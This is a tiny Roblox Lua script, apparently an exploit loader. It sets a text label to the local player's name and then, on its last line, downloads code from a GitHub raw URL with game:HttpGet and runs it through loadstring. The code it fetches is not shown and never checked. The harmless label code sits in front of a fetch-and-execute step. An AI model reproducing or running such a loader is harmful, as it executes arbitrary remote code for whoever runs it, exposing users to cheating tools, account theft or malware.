local function VQTQ_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	local player = game.Players.LocalPlayer
	script.Parent.Text = player.Name
end
coroutine.wrap(VQTQ_fake_script)()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ooaoaoaoaaooaoa/OpScriptGame/main/Dll"))();
